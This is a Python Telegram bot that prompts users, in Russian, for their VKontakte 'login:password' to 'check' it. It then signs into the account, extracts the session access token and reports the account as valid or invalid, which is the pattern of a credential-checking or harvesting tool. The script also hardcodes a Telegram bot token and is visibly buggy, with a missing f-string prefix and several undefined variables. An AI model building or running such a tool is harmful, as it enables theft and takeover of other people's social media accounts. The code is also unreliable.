from aiogram import Bot, types
from aiogram import executor
from aiogram import Dispatcher
from vk_api import VkApi
from vk_api.exceptions import BadPassword
import json, requests
from os import remove

TOKEN = "5267870594:AAGJGt6_0sCiMT5kkLV00YYmuypkH5HwAyk"
bot = Bot(TOKEN)
dp = Dispatcher(bot)


@dp.message_handler(commands=["start"])
async def start_msg(message: types.Message):
    await message.answer("Введите логин:пароль от вконтакте для проверки!")


@dp.message_handler(content_types=["text"])
async def get_data(message: types.Message):
    raw_data = message.text
    try:
        phone = raw_data.split(":")[0]
        password = raw_data.split(":")[1]
    except IndexError:
        await message.reply("Введите логин:пароль от вконтакте для проверки!")
    vk_session = VkApi(f"{phone}", "{password}")
    try:
        vk_session.auth()
        vk = VK.get_api()
    except BadPassword:
        await message.reply("Невалид❌")
    else:
        info = vk.users.get()
        with open("vk_config.v2.json", "r") as data_file:
            data = json.load(data_file)
            for xxx in data[login]["token"].keys():
                for yyy in data[login]["token"][xxx].keys():
                    access_token = data[login]["token"][xxx][yyy]["access_token"]
        await message.reply("Валид✅")
        await message.reply(
            f"Имя аккаунта: {User[0]['first_name']} {User[0]['last_name']}\nID страницы: {User[0]['id']}\nТокен: {access_token}"
        )
        remove("vk_config.v2.json")


if __name__ == "__main__":
    executor.start_polling(dp)
